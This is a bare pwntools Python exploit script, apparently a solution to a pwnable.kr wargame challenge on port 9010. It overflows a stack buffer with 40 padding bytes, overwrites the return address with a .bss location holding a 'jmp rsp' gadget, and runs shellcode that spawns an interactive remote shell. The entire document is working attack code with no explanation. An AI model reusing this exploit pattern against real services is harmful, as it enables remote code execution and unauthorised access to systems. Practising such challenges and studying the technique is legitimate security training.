from pwn import *
target = remote('pwnable.kr',9010)
context(os = 'linux',arch = 'amd64')
addr_bss = 0x6020A0
jmp2rsp = asm('jmp rsp')
target.recvuntil('name? :')
target.sendline(jmp2rsp + '\x00\x00')
target.recvuntil('>')
target.sendline('1')
shellcode = asm(shellcraft.sh())
payload = 'A' * 40 + p64(addr_bss) + shellcode
target.sendline(payload)
target.interactive()